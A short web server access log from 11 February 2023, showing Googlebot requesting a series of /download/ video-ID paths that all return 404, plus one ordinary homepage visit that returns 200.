66.249.73.234 - - [11/Feb/2023:19:58:14 +0000] "GET /download/v-AwnL8hAHs HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:58:33 +0000] "GET /download/gHqj5-gFpwc HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:58:53 +0000] "GET /download/gHqj5-gFpwc HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
193.32.162.159 - - [11/Feb/2023:19:59:12 +0000] "GET / HTTP/1.1" 200 18589 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
66.249.73.230 - - [11/Feb/2023:19:59:12 +0000] "GET /download/72Q2iQ0nRT0 HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:19:59:31 +0000] "GET /download/72Q2iQ0nRT0 HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:19:59:50 +0000] "GET /download/_EiNaSbLEuM HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:20:00:10 +0000] "GET /download/LwaY2acPxP8 HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:20:00:29 +0000] "GET /download/_EiNaSbLEuM HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:20:00:48 +0000] "GET /download/Z1qX1roxOVU HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:20:01:08 +0000] "GET /download/39jTpgvWE5M HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:20:01:27 +0000] "GET /download/39jTpgvWE5M HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:20:01:46 +0000] "GET /download/lsP2uyVvqKs HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:20:02:06 +0000] "GET /download/W320Nug6lbo HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.232 - - [11/Feb/2023:20:02:25 +0000] "GET /download/IROcWiJcB44 HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:20:02:44 +0000] "GET /download/IROcWiJcB44 HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:20:03:03 +0000] "GET /download/nBTGGuRs0kk HTTP/1.1" 404 6616 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.230 - - [11/Feb/2023:20:03:23 +0000] "GET /download/eo1QCLvxabc HTTP/1.1" 404 6622 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
